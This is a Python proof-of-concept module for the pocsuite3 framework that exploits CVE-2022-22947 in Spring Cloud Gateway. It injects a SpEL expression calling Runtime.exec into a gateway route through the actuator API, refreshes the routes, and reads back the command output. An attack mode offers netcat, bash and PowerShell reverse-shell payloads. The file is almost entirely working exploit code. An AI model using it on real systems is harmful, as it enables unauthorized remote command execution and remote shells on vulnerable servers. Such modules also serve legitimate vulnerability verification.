# !/usr/bin/env python
# -*- coding: UTF-8 -*-

from collections import OrderedDict
from json import dumps
from urllib.parse import urlparse, urljoin

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class Spring_Cloud_Gateway(POCBase):
    vulID = 'CVE-2022-22947'
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2022-03-03'
    createDate = '2022-03-03'
    updateDate = '2022-03-03'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2022-22947']
    name = '【CVE-2022-22947】Spring Cloud Gateway RCE'
    appPowerLink = ''
    appName = 'Spring Cloud Gateway'
    appVersion = """Spring Cloud Gateway < 3.1.1
Spring Cloud Gateway < 3.0.7"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Spring Cloud Gateway RCE'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
            "powershell": REVERSE_PAYLOAD.POWERSHELL,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _check(self, url, cmd=""):
        self.timeout = 5
        path = "actuator/gateway/routes/Warin9"
        vul_url = urljoin(url, path)

        cmd = cmd or "echo Warin9"
        command = "new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"{cmd}\").getInputStream()))".format(
            cmd=cmd)
        payload = {"id": "Warin9",
                   "filters":
                       [{
                           "name": "AddResponseHeader",
                           "args": {"name": "Result",
                                    "value": "#{{{command}}}".format(command=command),
                                    }
                       }],
                   "uri": "http://example.com",
                   "order": 0
                   }

        parse = urlparse(vul_url)
        headers = {
            "Host": "{}".format(parse.netloc),
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
            "Content-Type": "application/json"
        }
        try:
            
            r = requests.post(vul_url, headers=headers, timeout=self.timeout, data=dumps(payload), verify=False)
        except Exception:
            return False
        else:
            if r.status_code == 201:
                path = "actuator/gateway/refresh"
                vul_url = urljoin(url, path)
                parse = urlparse(vul_url)
                header = {
                    "Host": "{}".format(parse.netloc),
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Accept-Language": "en",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                try:
                    
                    r = requests.post(vul_url, headers=header, timeout=self.timeout, verify=False)
                except Exception:
                    return False
                else:
                    if r.status_code == 200:
                        path = "actuator/gateway/routes/Warin9"
                        vul_url = urljoin(url, path)
                        try:
                            
                            r = requests.get(vul_url, timeout=self.timeout, verify=False)
                        except Exception:
                            return False
                        else:
                            if r.status_code == 200 and "route_id" in r.text:
                                cmd_result = r.text
                                path = "actuator/gateway/routes/Warin9"
                                vul_url = urljoin(url, path)
                                try:
                                    
                                    r = requests.delete(vul_url, timeout=self.timeout, verify=False)
                                except Exception:
                                    return False
                                else:
                                    if r.status_code == 200:
                                        return url, cmd_result

        return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['COMMAND_RESULT'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        result = {}
        command = self.get_option("command")
        p = self._check(self.url, cmd=command)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['COMMAND_RESULT'] = p[1]

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('url is not vulnerable')
        return output


register_poc(Spring_Cloud_Gateway)
